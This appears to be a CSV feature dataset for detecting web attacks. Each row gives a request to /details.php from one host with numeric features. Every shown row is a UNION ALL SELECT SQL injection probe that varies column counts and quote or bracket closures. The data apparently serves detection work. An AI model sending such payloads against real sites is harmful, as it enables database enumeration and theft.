full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%27%29%29%20AS%20cswM%20WHERE%209054%3D9054%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,"/details.php?prod=5&type=2')) AS cswM WHERE 9054=9054 UNION ALL SELECT NULL,NULL#",1680093143.040741,10.0.2.31,6,57,170.3,2,14.035087719298245
/details.php?prod=5&type=2%27%29%29%20AS%20zuSN%20WHERE%208212%3D8212%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS zuSN WHERE 8212=8212 UNION ALL SELECT NULL,NULL,NULL#",1680093143.044421,10.0.2.31,6,62,170.3,2,12.903225806451612
/details.php?prod=5&type=2%27%29%29%20AS%20BvaT%20WHERE%201898%3D1898%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS BvaT WHERE 1898=1898 UNION ALL SELECT NULL,NULL,NULL,NULL#",1680093143.048449,10.0.2.31,6,67,170.3,2,11.940298507462687
/details.php?prod=5&type=2%27%29%29%20AS%20eDBP%20WHERE%209127%3D9127%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS eDBP WHERE 9127=9127 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1680093143.051452,10.0.2.31,6,72,170.3,2,11.11111111111111
/details.php?prod=5&type=2%27%29%29%20AS%20vEnl%20WHERE%209539%3D9539%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS vEnl WHERE 9539=9539 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.05504,10.0.2.31,6,77,170.3,2,10.38961038961039
/details.php?prod=5&type=2%27%29%29%20AS%20oLTb%20WHERE%203129%3D3129%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS oLTb WHERE 3129=3129 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.058377,10.0.2.31,6,82,170.3,2,9.75609756097561
/details.php?prod=5&type=2%27%29%29%20AS%20unUn%20WHERE%205630%3D5630%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS unUn WHERE 5630=5630 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.061574,10.0.2.31,6,87,170.3,2,9.195402298850574
/details.php?prod=5&type=2%27%29%29%20AS%20onUk%20WHERE%206943%3D6943%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS onUk WHERE 6943=6943 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.065649,10.0.2.31,6,92,170.3,2,8.695652173913043
/details.php?prod=5&type=2%27%29%29%20AS%20bYLz%20WHERE%208674%3D8674%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2')) AS bYLz WHERE 8674=8674 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.069838,10.0.2.31,6,97,170.3,2,8.24742268041237
/details.php?prod=5&type=2%22%29%29%20AS%20VTAC%20WHERE%203360%3D3360%20UNION%20ALL%20SELECT%20NULL%23,"/details.php?prod=5&type=2"")) AS VTAC WHERE 3360=3360 UNION ALL SELECT NULL#",1680093143.073435,10.0.2.31,6,52,170.3,2,15.384615384615385
/details.php?prod=5&type=2%22%29%29%20AS%20JKJZ%20WHERE%204562%3D4562%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS JKJZ WHERE 4562=4562 UNION ALL SELECT NULL,NULL#",1680093143.076878,10.0.2.31,6,57,170.3,2,14.035087719298245
/details.php?prod=5&type=2%22%29%29%20AS%20dFmY%20WHERE%209673%3D9673%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS dFmY WHERE 9673=9673 UNION ALL SELECT NULL,NULL,NULL#",1680093143.080908,10.0.2.31,6,62,170.3,2,12.903225806451612
/details.php?prod=5&type=2%22%29%29%20AS%20jYib%20WHERE%201894%3D1894%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS jYib WHERE 1894=1894 UNION ALL SELECT NULL,NULL,NULL,NULL#",1680093143.084385,10.0.2.31,6,67,170.3,2,11.940298507462687
/details.php?prod=5&type=2%22%29%29%20AS%20auxr%20WHERE%209444%3D9444%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS auxr WHERE 9444=9444 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1680093143.087966,10.0.2.31,6,72,170.3,2,11.11111111111111
/details.php?prod=5&type=2%22%29%29%20AS%20xImu%20WHERE%204009%3D4009%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS xImu WHERE 4009=4009 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.091339,10.0.2.31,6,77,170.3,2,10.38961038961039
/details.php?prod=5&type=2%22%29%29%20AS%20zXHH%20WHERE%206554%3D6554%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS zXHH WHERE 6554=6554 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.094654,10.0.2.31,6,82,170.3,2,9.75609756097561
/details.php?prod=5&type=2%22%29%29%20AS%20FSBI%20WHERE%202568%3D2568%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS FSBI WHERE 2568=2568 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.098551,10.0.2.31,6,87,170.3,2,9.195402298850574
/details.php?prod=5&type=2%22%29%29%20AS%20iGTS%20WHERE%201077%3D1077%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS iGTS WHERE 1077=1077 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.102846,10.0.2.31,6,92,170.3,2,8.695652173913043
/details.php?prod=5&type=2%22%29%29%20AS%20fIHb%20WHERE%208737%3D8737%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"")) AS fIHb WHERE 8737=8737 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.106082,10.0.2.31,6,97,170.3,2,8.24742268041237
/details.php?prod=5&type=2%27%29%20AS%20qcsE%20WHERE%205827%3D5827%20UNION%20ALL%20SELECT%20NULL%23,/details.php?prod=5&type=2') AS qcsE WHERE 5827=5827 UNION ALL SELECT NULL#,1680093143.109606,10.0.2.31,6,51,170.3,2,15.686274509803921
/details.php?prod=5&type=2%27%29%20AS%20ASLa%20WHERE%201141%3D1141%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,"/details.php?prod=5&type=2') AS ASLa WHERE 1141=1141 UNION ALL SELECT NULL,NULL#",1680093143.113657,10.0.2.31,6,56,170.3,2,14.285714285714286
/details.php?prod=5&type=2%27%29%20AS%20LRWf%20WHERE%202139%3D2139%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS LRWf WHERE 2139=2139 UNION ALL SELECT NULL,NULL,NULL#",1680093143.116801,10.0.2.31,6,61,170.3,2,13.114754098360656
/details.php?prod=5&type=2%27%29%20AS%20mlFT%20WHERE%204989%3D4989%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS mlFT WHERE 4989=4989 UNION ALL SELECT NULL,NULL,NULL,NULL#",1680093143.120119,10.0.2.31,6,66,170.3,2,12.121212121212121
/details.php?prod=5&type=2%27%29%20AS%20PDos%20WHERE%204149%3D4149%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS PDos WHERE 4149=4149 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1680093143.123682,10.0.2.31,6,71,170.3,2,11.267605633802816
/details.php?prod=5&type=2%27%29%20AS%20GqYs%20WHERE%208436%3D8436%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS GqYs WHERE 8436=8436 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.127083,10.0.2.31,6,76,170.3,2,10.526315789473685
/details.php?prod=5&type=2%27%29%20AS%20MQDu%20WHERE%206689%3D6689%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS MQDu WHERE 6689=6689 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.130764,10.0.2.31,6,81,170.3,2,9.876543209876543
/details.php?prod=5&type=2%27%29%20AS%20IApM%20WHERE%205120%3D5120%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS IApM WHERE 5120=5120 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.135084,10.0.2.31,6,86,170.3,2,9.30232558139535
/details.php?prod=5&type=2%27%29%20AS%20qPxx%20WHERE%206778%3D6778%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS qPxx WHERE 6778=6778 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.138423,10.0.2.31,6,91,170.3,2,8.791208791208792
/details.php?prod=5&type=2%27%29%20AS%20Pzio%20WHERE%207091%3D7091%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2') AS Pzio WHERE 7091=7091 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.142186,10.0.2.31,6,96,170.3,2,8.333333333333334
/details.php?prod=5&type=2%22%29%20AS%20iqvF%20WHERE%206307%3D6307%20UNION%20ALL%20SELECT%20NULL%23,"/details.php?prod=5&type=2"") AS iqvF WHERE 6307=6307 UNION ALL SELECT NULL#",1680093143.146215,10.0.2.31,6,51,170.3,2,15.686274509803921
/details.php?prod=5&type=2%22%29%20AS%20YEfi%20WHERE%209006%3D9006%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,"/details.php?prod=5&type=2"") AS YEfi WHERE 9006=9006 UNION ALL SELECT NULL,NULL#",1680093143.14968,10.0.2.31,6,56,170.3,2,14.285714285714286
/details.php?prod=5&type=2%22%29%20AS%20FDGZ%20WHERE%207986%3D7986%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS FDGZ WHERE 7986=7986 UNION ALL SELECT NULL,NULL,NULL#",1680093143.153201,10.0.2.31,6,61,170.3,2,13.114754098360656
/details.php?prod=5&type=2%22%29%20AS%20DjnZ%20WHERE%203771%3D3771%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS DjnZ WHERE 3771=3771 UNION ALL SELECT NULL,NULL,NULL,NULL#",1680093143.157122,10.0.2.31,6,66,170.3,2,12.121212121212121
/details.php?prod=5&type=2%22%29%20AS%20PQKB%20WHERE%205431%3D5431%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS PQKB WHERE 5431=5431 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1680093143.160524,10.0.2.31,6,71,170.3,2,11.267605633802816
/details.php?prod=5&type=2%22%29%20AS%20tIRK%20WHERE%207991%3D7991%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS tIRK WHERE 7991=7991 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.164422,10.0.2.31,6,76,170.3,2,10.526315789473685
/details.php?prod=5&type=2%22%29%20AS%20PWfX%20WHERE%205677%3D5677%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS PWfX WHERE 5677=5677 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.168197,10.0.2.31,6,81,170.3,2,9.876543209876543
/details.php?prod=5&type=2%22%29%20AS%20Evim%20WHERE%203409%3D3409%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS Evim WHERE 3409=3409 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.171247,10.0.2.31,6,86,170.3,2,9.30232558139535
/details.php?prod=5&type=2%22%29%20AS%20GNBs%20WHERE%209026%3D9026%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS GNBs WHERE 9026=9026 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.174938,10.0.2.31,6,91,170.3,2,8.791208791208792
/details.php?prod=5&type=2%22%29%20AS%20iEbm%20WHERE%206445%3D6445%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2"") AS iEbm WHERE 6445=6445 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.17881,10.0.2.31,6,96,170.3,2,8.333333333333334
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%23,/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL#,1680093143.182362,10.0.2.31,5,43,170.3,2,16.27906976744186
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL#",1680093143.186091,10.0.2.31,5,48,170.3,2,14.583333333333334
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL#",1680093143.189467,10.0.2.31,5,53,170.3,2,13.20754716981132
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL#",1680093143.192575,10.0.2.31,5,58,170.3,2,12.068965517241379
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#",1680093143.196048,10.0.2.31,5,63,170.3,2,11.11111111111111
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.199868,10.0.2.31,5,68,170.3,2,10.294117647058824
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.203041,10.0.2.31,5,73,170.3,2,9.58904109589041
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.206435,10.0.2.31,5,78,170.3,2,8.974358974358974
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.209655,10.0.2.31,5,83,170.3,2,8.433734939759036
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1680093143.213132,10.0.2.31,5,88,170.3,2,7.954545454545454
/details.php?prod=5&type=-5225%29%20UNION%20ALL%20SELECT%202764%23,/details.php?prod=5&type=-5225) UNION ALL SELECT 2764#,1680093143.217208,10.0.2.31,4,30,170.3,1,16.666666666666668
/details.php?prod=5&type=-8264%29%20UNION%20ALL%20SELECT%203175%2C3175%23,"/details.php?prod=5&type=-8264) UNION ALL SELECT 3175,3175#",1680093143.220522,10.0.2.31,4,35,170.3,1,14.285714285714286
/details.php?prod=5&type=-2330%29%20UNION%20ALL%20SELECT%206621%2C6621%2C6621%23,"/details.php?prod=5&type=-2330) UNION ALL SELECT 6621,6621,6621#",1680093143.223777,10.0.2.31,4,40,170.3,1,12.5
/details.php?prod=5&type=-1267%29%20UNION%20ALL%20SELECT%203227%2C3227%2C3227%2C3227%23,"/details.php?prod=5&type=-1267) UNION ALL SELECT 3227,3227,3227,3227#",1680093143.229612,10.0.2.31,4,45,170.3,1,11.11111111111111
/details.php?prod=5&type=-8290%29%20UNION%20ALL%20SELECT%201353%2C1353%2C1353%2C1353%2C1353%23,"/details.php?prod=5&type=-8290) UNION ALL SELECT 1353,1353,1353,1353,1353#",1680093143.245476,10.0.2.31,4,50,170.3,1,10.0
/details.php?prod=5&type=-6096%29%20UNION%20ALL%20SELECT%206979%2C6979%2C6979%2C6979%2C6979%2C6979%23,"/details.php?prod=5&type=-6096) UNION ALL SELECT 6979,6979,6979,6979,6979,6979#",1680093143.25208,10.0.2.31,4,55,170.3,1,9.090909090909092
/details.php?prod=5&type=-6044%29%20UNION%20ALL%20SELECT%201787%2C1787%2C1787%2C1787%2C1787%2C1787%2C1787%23,"/details.php?prod=5&type=-6044) UNION ALL SELECT 1787,1787,1787,1787,1787,1787,1787#",1680093143.262106,10.0.2.31,4,60,170.3,1,8.333333333333334
/details.php?prod=5&type=-2176%29%20UNION%20ALL%20SELECT%204924%2C4924%2C4924%2C4924%2C4924%2C4924%2C4924%2C4924%23,"/details.php?prod=5&type=-2176) UNION ALL SELECT 4924,4924,4924,4924,4924,4924,4924,4924#",1680093143.267379,10.0.2.31,4,65,170.3,1,7.6923076923076925
/details.php?prod=5&type=-2118%29%20UNION%20ALL%20SELECT%208311%2C8311%2C8311%2C8311%2C8311%2C8311%2C8311%2C8311%2C8311%23,"/details.php?prod=5&type=-2118) UNION ALL SELECT 8311,8311,8311,8311,8311,8311,8311,8311,8311#",1680093143.270665,10.0.2.31,4,70,170.3,1,7.142857142857143
/details.php?prod=5&type=-9113%29%20UNION%20ALL%20SELECT%208594%2C8594%2C8594%2C8594%2C8594%2C8594%2C8594%2C8594%2C8594%2C8594%23,"/details.php?prod=5&type=-9113) UNION ALL SELECT 8594,8594,8594,8594,8594,8594,8594,8594,8594,8594#",1680093143.274446,10.0.2.31,4,75,170.3,1,6.666666666666667
/details.php?prod=5&type=-9092%29%20UNION%20ALL%20SELECT%207733%23,/details.php?prod=5&type=-9092) UNION ALL SELECT 7733#,1680093143.280538,10.0.2.31,4,30,170.3,1,16.666666666666668
/details.php?prod=5&type=-7656%29%20UNION%20ALL%20SELECT%208664%2C8664%23,"/details.php?prod=5&type=-7656) UNION ALL SELECT 8664,8664#",1680093143.293363,10.0.2.31,4,35,170.3,1,14.285714285714286
/details.php?prod=5&type=-6140%29%20UNION%20ALL%20SELECT%205268%2C5268%2C5268%23,"/details.php?prod=5&type=-6140) UNION ALL SELECT 5268,5268,5268#",1680093143.297493,10.0.2.31,4,40,170.3,1,12.5
/details.php?prod=5&type=-3656%29%20UNION%20ALL%20SELECT%204837%2C4837%2C4837%2C4837%23,"/details.php?prod=5&type=-3656) UNION ALL SELECT 4837,4837,4837,4837#",1680093143.302069,10.0.2.31,4,45,170.3,1,11.11111111111111
/details.php?prod=5&type=-4739%29%20UNION%20ALL%20SELECT%203648%2C3648%2C3648%2C3648%2C3648%23,"/details.php?prod=5&type=-4739) UNION ALL SELECT 3648,3648,3648,3648,3648#",1680093143.306304,10.0.2.31,4,50,170.3,1,10.0
/details.php?prod=5&type=-2010%29%20UNION%20ALL%20SELECT%208127%2C8127%2C8127%2C8127%2C8127%2C8127%23,"/details.php?prod=5&type=-2010) UNION ALL SELECT 8127,8127,8127,8127,8127,8127#",1680093143.309567,10.0.2.31,4,55,170.3,1,9.090909090909092
/details.php?prod=5&type=-8175%29%20UNION%20ALL%20SELECT%202949%2C2949%2C2949%2C2949%2C2949%2C2949%2C2949%23,"/details.php?prod=5&type=-8175) UNION ALL SELECT 2949,2949,2949,2949,2949,2949,2949#",1680093143.313624,10.0.2.31,4,60,170.3,1,8.333333333333334
/details.php?prod=5&type=-7490%29%20UNION%20ALL%20SELECT%205093%2C5093%2C5093%2C5093%2C5093%2C5093%2C5093%2C5093%23,"/details.php?prod=5&type=-7490) UNION ALL SELECT 5093,5093,5093,5093,5093,5093,5093,5093#",1680093143.318141,10.0.2.31,4,65,170.3,1,7.6923076923076925
/details.php?prod=5&type=-1486%29%20UNION%20ALL%20SELECT%207188%2C7188%2C7188%2C7188%2C7188%2C7188%2C7188%2C7188%2C7188%23,"/details.php?prod=5&type=-1486) UNION ALL SELECT 7188,7188,7188,7188,7188,7188,7188,7188,7188#",1680093143.321235,10.0.2.31,4,70,170.3,1,7.142857142857143
/details.php?prod=5&type=-7933%29%20UNION%20ALL%20SELECT%207916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%2C7916%23,"/details.php?prod=5&type=-7933) UNION ALL SELECT 7916,7916,7916,7916,7916,7916,7916,7916,7916,7916#",1680093143.324799,10.0.2.31,4,75,170.3,1,6.666666666666667
/details.php?prod=5&type=-2948%29%29%20UNION%20ALL%20SELECT%209788%23,/details.php?prod=5&type=-2948)) UNION ALL SELECT 9788#,1680093143.328422,10.0.2.31,4,31,170.3,1,16.129032258064516
/details.php?prod=5&type=-3156%29%29%20UNION%20ALL%20SELECT%208069%2C8069%23,"/details.php?prod=5&type=-3156)) UNION ALL SELECT 8069,8069#",1680093143.332226,10.0.2.31,4,36,170.3,1,13.88888888888889
/details.php?prod=5&type=-7940%29%29%20UNION%20ALL%20SELECT%208913%2C8913%2C8913%23,"/details.php?prod=5&type=-7940)) UNION ALL SELECT 8913,8913,8913#",1680093143.335736,10.0.2.31,4,41,170.3,1,12.195121951219512
/details.php?prod=5&type=-2145%29%29%20UNION%20ALL%20SELECT%208691%2C8691%2C8691%2C8691%23,"/details.php?prod=5&type=-2145)) UNION ALL SELECT 8691,8691,8691,8691#",1680093143.339168,10.0.2.31,4,46,170.3,1,10.869565217391305
/details.php?prod=5&type=-1474%29%29%20UNION%20ALL%20SELECT%203687%2C3687%2C3687%2C3687%2C3687%23,"/details.php?prod=5&type=-1474)) UNION ALL SELECT 3687,3687,3687,3687,3687#",1680093143.3423,10.0.2.31,4,51,170.3,1,9.803921568627452
/details.php?prod=5&type=-5628%29%29%20UNION%20ALL%20SELECT%203936%2C3936%2C3936%2C3936%2C3936%2C3936%23,"/details.php?prod=5&type=-5628)) UNION ALL SELECT 3936,3936,3936,3936,3936,3936#",1680093143.345922,10.0.2.31,4,56,170.3,1,8.928571428571429
/details.php?prod=5&type=-9290%29%29%20UNION%20ALL%20SELECT%202421%2C2421%2C2421%2C2421%2C2421%2C2421%2C2421%23,"/details.php?prod=5&type=-9290)) UNION ALL SELECT 2421,2421,2421,2421,2421,2421,2421#",1680093143.349561,10.0.2.31,4,61,170.3,1,8.19672131147541
/details.php?prod=5&type=-9368%29%29%20UNION%20ALL%20SELECT%203494%2C3494%2C3494%2C3494%2C3494%2C3494%2C3494%2C3494%23,"/details.php?prod=5&type=-9368)) UNION ALL SELECT 3494,3494,3494,3494,3494,3494,3494,3494#",1680093143.352242,10.0.2.31,4,66,170.3,1,7.575757575757576
/details.php?prod=5&type=-4813%29%29%20UNION%20ALL%20SELECT%207719%2C7719%2C7719%2C7719%2C7719%2C7719%2C7719%2C7719%2C7719%23,"/details.php?prod=5&type=-4813)) UNION ALL SELECT 7719,7719,7719,7719,7719,7719,7719,7719,7719#",1680093143.355686,10.0.2.31,4,71,170.3,1,7.042253521126761
/details.php?prod=5&type=-5106%29%29%20UNION%20ALL%20SELECT%209755%2C9755%2C9755%2C9755%2C9755%2C9755%2C9755%2C9755%2C9755%2C9755%23,"/details.php?prod=5&type=-5106)) UNION ALL SELECT 9755,9755,9755,9755,9755,9755,9755,9755,9755,9755#",1680093143.35916,10.0.2.31,4,76,170.3,1,6.578947368421052
/details.php?prod=5&type=-8787%29%29%29%20UNION%20ALL%20SELECT%201811%23,/details.php?prod=5&type=-8787))) UNION ALL SELECT 1811#,1680093143.362888,10.0.2.31,4,32,170.3,1,15.625
/details.php?prod=5&type=-5177%29%29%29%20UNION%20ALL%20SELECT%208144%2C8144%23,"/details.php?prod=5&type=-5177))) UNION ALL SELECT 8144,8144#",1680093143.366088,10.0.2.31,4,37,170.3,1,13.513513513513514
